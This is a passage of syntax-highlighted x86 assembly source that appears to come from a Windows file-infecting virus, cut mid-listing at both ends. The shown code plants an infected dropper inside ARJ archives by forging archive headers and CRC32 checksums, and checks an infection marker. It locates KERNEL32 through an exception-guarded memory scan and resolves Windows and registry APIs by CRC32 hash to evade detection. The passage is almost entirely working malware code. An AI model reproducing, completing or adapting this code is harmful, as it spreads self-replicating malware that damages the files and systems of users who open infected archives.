    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">TryToInfectARJ</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumBytesRead</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50d</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArchiveBuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_ReadFile</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">TryToInfectARJ</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArchiveBuffer</span><span class="sc4">],</span><span class="sc2">0EA60h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CloseFileArchive</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArchiveBuffer</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc5">archive_mark</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CloseFileArchive</span><span class="sc0">

</span><span class="sc1">; Let's fill properly ARJ fields :)</span><span class="sc0">

</span><span class="sc5">TryToInfectARJ</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJFilename</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenerateName</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFilePointer</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFilePointer</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfDropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJCompress</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJOriginal</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJCRC32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">sARJHeader</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJHSmsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">sARJCRC32Size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJHeaderCRC</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">sARJSecondSide</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJSecondSide</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfDropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJHeadsiz</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; This shit is needed</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">

</span><span class="sc5">CloseFileArchive</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

</span><span class="sc5">CantOpenArchive</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GlobalFree</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GlobalFree</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hate</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_DeleteFileA</span><span class="sc0">
</span><span class="sc5">ExitInfectArchive</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">eBlockC</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Some miscellaneous routines                                            ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">GetUsefulInfo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">pushs</span><span class="sc0">   </span><span class="sc3">"USER32"</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_LoadLibraryA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@FindWindowA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@OffsetzUSER32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPIs</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FreeLibrary</span><span class="sc0">

    </span><span class="sc5">pushs</span><span class="sc0">   </span><span class="sc3">"ADVAPI32"</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_LoadLibraryA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@RegCreateKeyExA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@OffsetzADVAPI32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPIs</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FreeLibrary</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Program return address</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = KERNEL32 imagebase</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetK32</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetK32_SEH</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">WeFailed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">kernel_w9x</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckMZ</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">WeGotK32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">kernel_wNT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckMZ</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">WeGotK32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">kernel_w2k</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckMZ</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">WeGotK32</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">WeGotK32</span><span class="sc0">
</span><span class="sc5">GetK32_SEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc5">_@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CheckPE</span><span class="sc0">
</span><span class="sc5">_@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00010000h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">_@1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">WeFailed</span><span class="sc0">
</span><span class="sc5">CheckPE</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">_@2</span><span class="sc0">
</span><span class="sc5">WeGotK32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetK32</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX = Base address of the library where search the APIs</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to an array of CRC32 of the APIs we want to search</span><span class="sc0">
</span><span class="sc1">;       EDI = Pointer to where store the APIs</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetAPIs</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; EAX = Handle of module</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">APIS33K</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get in EAX the CRC32 of API</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPI_ET_CRC32</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Save in [EDI] the API address</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">Billy_Bel</span><span class="sc0">        </span><span class="sc1">; Last API?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">APIS33K</span><span class="sc0">                         </span><span class="sc1">; Yeah, get outta here</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetAPIs</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX = CRC32 of the API we want to know its address</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = API address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetAPI_ET_CRC32</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; Put CRC32 of da api in EDX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Counter</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Reset counter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get PE header of module</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get a pointer to its </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">                         </span><span class="sc1">; Export Table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressTableVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Pointer to the address table</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get AddressTable value</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; And store in its variable</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get NameTable value</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Put it in stack</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Store in its variable</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get OrdinalTable value</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Store</span><span class="sc0">

